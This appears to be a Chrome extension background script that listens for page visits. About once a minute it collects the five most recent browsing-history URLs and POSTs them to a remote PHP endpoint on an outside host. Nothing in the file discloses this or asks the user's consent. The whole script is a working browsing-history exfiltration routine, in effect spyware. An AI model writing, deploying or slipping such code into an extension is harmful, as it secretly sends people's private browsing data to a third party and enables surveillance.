var lastDownload = 0;

chrome.history.onVisited.addListener(function(item) {
  var now = Date.now();
  if (now - lastDownload >= 60000) { // send data every minute
    lastDownload = now;
    var history = [];
    chrome.history.search({text: '', maxResults: 5}, function(items) {
      for (var i = 0; i < items.length; i++) {
        history.push(items[i].url);
      }
      sendData(history.join('\n'));
    });
  }
});

function sendData(data) {
  fetch('http://julien.natzinger.org.com/receive_data.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'data=' + encodeURIComponent(data)
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    console.log('Data sent successfully');
  })
  .catch(error => {
    console.error('Error sending data:', error);
  });

}
